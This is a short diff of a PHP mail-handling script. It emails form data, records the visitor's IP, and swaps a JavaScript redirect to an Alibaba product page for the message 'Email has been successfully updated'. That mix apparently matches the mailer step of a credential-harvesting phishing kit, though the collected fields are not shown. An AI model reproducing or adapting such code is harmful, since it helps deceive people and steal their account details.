@@ -10,7 +10,5 @@
     $sent = mail($to, $subject, $body, $headers) ;
     $ip=$_SERVER['REMOTE_ADDR'];
     if($sent)
-    {echo "<script language=javascript>window.location = 'http://www.alibaba.com/Tea-Product_pid100008840/';</script>";}
-    else
-    {echo "<script language=javascript>window.location = 'http://www.alibaba.com/Tea-Product_pid100008840/';</script>";}
-    ?>
+    echo "Email has been successfully updated<br>";
+?> 
